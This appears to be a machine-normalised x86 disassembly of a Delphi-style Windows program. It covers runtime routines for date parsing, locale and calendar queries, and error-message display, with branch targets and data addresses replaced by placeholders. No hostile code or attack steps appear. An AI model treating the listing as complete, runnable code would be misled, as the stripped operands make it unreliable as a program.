lea eax [ ebp - 0x1e ]
push eax
lea ecx [ ebp - 0x16 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4149a8
test al al
je r-xdata
mov edx ebx
movzx ecx [ rw-data ]
mov eax [ ebp - 0x8 ]
call sub_414b50
test al al
je r-xdata
call sub_413c70
mov esi eax
cmp [ ebp - 0x12 ] 0x1
jne r-xdata
lea eax [ ebp - 0x1f ]
push eax
lea ecx [ ebp - 0x18 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4149a8
test al al
je r-xdata
movzx eax [ ebp - 0x14 ]
mov [ ebp - 0x1a ] ax
movzx eax [ ebp - 0x16 ]
mov [ ebp - 0x1c ] ax
movzx eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] ax
movzx eax [ ebp - 0x16 ]
mov [ ebp - 0x1a ] ax
jmp r-xdata
movzx eax [ ebp - 0x12 ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x10 ]
push eax
movzx ecx [ ebp - 0x1c ]
movzx edx [ ebp - 0x1a ]
mov eax esi
call sub_413a10
mov [ ebp - 0x11 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_407ae0
test eax eax
je r-xdata
mov edx ebx
movzx ecx [ rw-data ]
mov eax [ ebp - 0x8 ]
call sub_414b50
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_41493c
cmp [ rw-data ] 0x0
je r-xdata
movzx esi [ ebp - 0x18 ]
movzx eax [ ebp - 0x1f ]
mov [ ebp - 0x20 ] al
movzx eax [ ebp - 0x14 ]
mov [ ebp - 0x1a ] ax
movzx eax [ ebp - 0x16 ]
mov [ ebp - 0x1c ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
movzx eax [ eax ]
add eax 0xffffffd0
sub ax 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
movzx esi [ ebp - 0x18 ]
movzx eax [ ebp - 0x1f ]
mov [ ebp - 0x20 ] al
movzx eax [ ebp - 0x16 ]
mov [ ebp - 0x1a ] ax
movzx eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] ax
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x8 ]
call sub_406a60
call sub_407400
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_414c94
jmp r-xdata
cmp [ ebp - 0x20 ] 0x2
ja r-xdata
push ebp
movzx eax si
call sub_414dac
pop ecx
mov esi eax
jmp r-xdata
movzx esi [ ebp - 0x14 ]
movzx eax [ ebp - 0x1d ]
mov [ ebp - 0x20 ] al
movzx eax [ ebp - 0x16 ]
mov [ ebp - 0x1a ] ax
movzx eax [ ebp - 0x18 ]
mov [ ebp - 0x1c ] ax
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_41493c
lea eax [ ebp - 0x8 ]
call sub_406a60
call sub_407400
cmp eax [ ebx ]
jl r-xdata
lea eax [ ebp - 0x8 ]
call sub_406a60
mov edx [ ebx ]
cmp [ eax + edx * 2 - 0x2 ] 0x20
jne r-xdata
call sub_413c70
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
mov edi 0x64
cdq
idiv edi
imul ax ax 0x64
add si ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax rw-data
call sub_406a60
call sub_407400
mov ecx eax
mov edx [ ebx ]
mov eax [ ebp - 0x8 ]
call sub_4077d0
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_411254
test eax eax
je r-xdata
inc [ ebx ]
movzx eax si
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax rw-data
call sub_406a60
call sub_407400
mov ecx eax
mov edx [ ebx ]
mov eax [ ebp - 0x8 ]
call sub_4077d0
mov edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_411254
test eax eax
jne r-xdata
add si 0x64
jmp r-xdata
sub_4151c0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_414a70
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_414a70
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_414a70
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_4149a8
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_41493c
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_414a70
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
movzx ecx [ rw-data ]
mov eax ebp
call sub_414b50
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_4149a8
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_414a70
test al al
jne r-xdata
mov edx esi
movzx ecx [ rw-data ]
mov eax ebp
call sub_414b50
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_41493c
movzx eax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
movzx ecx [ esp + 0x10 ]
movzx edx [ esp + 0xe ]
movzx eax [ esp + 0xc ]
call sub_413908
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_414a70
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_4149a8
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_414a70
test al al
jne r-xdata
mov edx esi
movzx ecx [ rw-data ]
mov eax ebp
call sub_414b50
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_414a70
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_4149a8
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_4153c8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_41544a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x1
mov ecx ebx
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414e08
test al al
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp eax [ ebp - 0x8 ]
setl al
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415451
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_415458
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_4154da
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x1
mov ecx ebx
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4151c0
test al al
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp eax [ ebp - 0x8 ]
setl al
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4154e1
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_4154e8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_4156cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov [ ebp - 0xc ] 0x1
xor eax eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_414c94
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_414e08
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_415458
mov ebx eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_414c94
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp eax [ ebp - 0x10 ]
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
dec eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4156d2
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
jl r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x14 ] 0x0
jle r-xdata
cmp [ ebp - 0x14 ] 0x0
jle r-xdata
fld [ ebp - 0x20 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
jb r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
jge r-xdata
mov bl 0x1
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
jge r-xdata
fld [ ebp - 0x20 ]
fsub [ ebp - 0x28 ]
mov eax [ ebp - 0x8 ]
fstp [ eax ]
fwait
jmp r-xdata
fld [ ebp - 0x20 ]
fadd [ ebp - 0x28 ]
mov eax [ ebp - 0x8 ]
fstp [ eax ]
fwait
jmp r-xdata
lea ecx [ ebp - 0x28 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4151c0
mov ebx eax
test bl bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov esi [ ebp - 0x14 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_40d518
mov [ ebp - 0x14 ] eax
inc [ ebp - 0x14 ]
mov edi [ ebp - 0x14 ]
lea edx [ ebp - 0x14 ]
mov ecx [ rw-data ]
mov eax [ ebp - 0x4 ]
call sub_414a70
test al al
jne r-xdata
mov bl 0x1
lea edx [ ebp - 0x14 ]
mov ecx r-xdata
mov eax [ ebp - 0x4 ]
call sub_414a70
test al al
jne r-xdata
test bl bl
jne r-xdata
lea edx [ ebp - 0x14 ]
mov ecx [ rw-data ]
mov eax [ ebp - 0x4 ]
call sub_414a70
test al al
jne r-xdata
lea edx [ ebp - 0x14 ]
mov ecx r-xdata
mov eax [ ebp - 0x4 ]
call sub_414a70
test al al
jne r-xdata
xor ebx ebx
jmp r-xdata
mov [ ebp - 0x14 ] edi
jmp r-xdata
sub_415718
push ebx
add esp 0xfffffe00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageW
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_4071e4
add esp 0x200
pop ebx
retn
movzx edx [ esp + eax * 2 - 0x2 ]
sub dx 0x21
jb r-xdata
dec eax
sub dx 0xd
je r-xdata
sub_415768
push ebp
mov ebp esp
add esp 0xfffffe00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x200 ]
push ecx
push edx
push eax
call GetLocaleInfoW
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_4070a8
mov ecx eax
dec ecx
lea edx [ ebp - 0x200 ]
mov eax ebx
call sub_4071e4
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4157b4
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push ebx
call GetLocaleInfoW
test eax eax
jle r-xdata
mov eax edi
movzx eax [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_4157e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_415768
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_40a204
sub_415820
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_415933
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_4157e0
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4070a8
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_4157e0
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_4070a8
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_4157e0
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4070a8
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_4157e0
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_4070a8
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41593a
lea eax [ ebp - 0x18 ]
mov edx 0x4
call j_sub_4068c4
retn
sub_415944
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_407254
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_415980
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_4159e5
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_407254
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_411bac
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4159ec
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
inc ebx
sub_4159f8
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_415a8f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_415768
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_411bac
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415a96
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_415944
call EnumCalendarInfoW
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_415980
call EnumCalendarInfoW
sub_415aac
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_415cdf
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
xor edx edx
call sub_4070a8
lea eax [ ebp - 0xc ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_415768
mov eax [ ebp - 0xc ]
mov edx 0x1
call sub_411bac
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
lea eax [ ebp - 0x4 ]
call sub_406a60
call sub_407400
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415ce6
lea eax [ ebp - 0x18 ]
mov edx 0x4
call j_sub_4068c4
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
cmp [ esi + ebx * 2 - 0x2 ] 0xd800
jb r-xdata
mov eax esi
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
mov eax edi
mov edx [ ebp - 0x4 ]
call sub_4070a8
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
lea eax [ eax + ebx * 2 - 0x2 ]
mov ecx 0x2
call sub_412730
test eax eax
jne r-xdata
cmp [ esi + ebx * 2 - 0x2 ] 0xdfff
ja r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov esi eax
lea eax [ ebp - 0x4 ]
call sub_406a60
call sub_407400
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
lea eax [ eax + ebx * 2 - 0x2 ]
mov ecx 0x4
call sub_412730
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_4074a4
inc ebx
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417954
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
movzx esi [ eax + ebx * 2 - 0x2 ]
mov eax esi
sub ax 0x47
je r-xdata
jmp r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
lea eax [ eax + ebx * 2 - 0x2 ]
mov ecx 0x2
call sub_412730
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_4074a4
add ebx 0x3
jmp r-xdata
inc ebx
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4077d0
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_4074a4
add ebx [ ebp - 0x8 ]
jmp r-xdata
adc eax 0x0
inc ebx
sub ax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + ebx * 2 - 0x2 ]
sub ax 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_4074a4
inc ebx
jmp r-xdata
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_407214
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_4074a4
mov eax edi
mov edx r-xdata
call sub_4074a4
jmp r-xdata
sub ax 0x20
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + ebx * 2 - 0x2 ]
call sub_407214
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_4074a4
sub_415d78
push ebp
mov ebp esp
add esp 0xfffff99c
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x664 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_415f24
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1c
lea eax [ ebp - 0x638 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x628 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x41c ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameW
mov eax ebx
call sub_415d6c
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x41c ]
push eax
mov eax [ ebp - 0x634 ]
push eax
call GetModuleFileNameW
test eax eax
jne r-xdata
lea eax [ ebp - 0x41c ]
mov dx 0x5c
call sub_417c7c
mov edx eax
add edx 0x2
lea eax [ ebp - 0x212 ]
mov ecx 0x104
call sub_4125d4
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
sub ebx [ ebp - 0x634 ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x61c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_408a10
push eax
call LoadStringW
lea edx [ ebp - 0x664 ]
mov eax [ esi ]
call sub_4054c8
mov eax [ ebp - 0x664 ]
mov [ ebp - 0x660 ] eax
mov [ ebp - 0x65c ] 0x11
lea eax [ ebp - 0x212 ]
mov [ ebp - 0x658 ] eax
mov [ ebp - 0x654 ] 0xa
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x650 ] eax
mov [ ebp - 0x64c ] 0x5
mov [ ebp - 0x648 ] ebx
mov [ ebp - 0x644 ] 0xa
mov [ ebp - 0x640 ] edi
mov [ ebp - 0x63c ] 0xa
lea eax [ ebp - 0x660 ]
push eax
push 0x4
lea ecx [ ebp - 0x61c ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4129b0
mov eax [ ebp - 0x4 ]
call sub_412550
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415f2b
lea eax [ ebp - 0x664 ]
call j_sub_4068a0
retn
mov eax [ esi + 0x4 ]
call sub_407134
mov ebx eax
mov eax ebx
call sub_412550
test eax eax
je r-xdata
cmp [ ebx + eax * 2 - 0x2 ] 0x2e
je r-xdata
mov edi r-xdata
sub_415f68
push ebp
mov ebp esp
add esp 0xfffff778
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
push ebp
push sub_41608d
push [ fs : ecx ]
mov [ fs : ecx ] esp
push 0x400
lea ecx [ ebp - 0x888 ]
call sub_415d78
mov esi eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ ebp - 0x88 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_408a10
push eax
call LoadStringW
push 0x2010
lea eax [ ebp - 0x88 ]
push eax
lea eax [ ebp - 0x888 ]
push eax
push 0x0
call MessageBoxW
mov eax [ rw-data ]
call sub_40498c
call sub_40436c
push 0x0
push 0x0
push 0x0
push 0x0
push esi
lea eax [ ebp - 0x888 ]
push eax
push 0x0
push 0x1
call WideCharToMultiByte
mov ebx eax
push ebx
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
push 0x0
push 0x0
push ebx
mov eax [ ebp - 0x4 ]
push eax
push esi
lea eax [ ebp - 0x888 ]
push eax
push 0x0
push 0x1
call WideCharToMultiByte
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push ebx
mov eax [ ebp - 0x4 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416094
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_408928
retn
sub_4160ac
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_4070a8
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_4160e8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_416142
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_4129f4
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_4070a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416149
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
add esp 0xfffffff0
call sub_405b0c
sub_416149
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_416168
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_4161bb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_411ee4
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_4070a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4161c2
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
add esp 0xfffffff0
call sub_405b0c
sub_4161c2
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_4161e0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_40a204
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_41621c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_416288
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_411ee4
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_4129f4
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_4070a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41628f
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
add esp 0xfffffff0
call sub_405b0c
sub_41628f
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_4162b0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
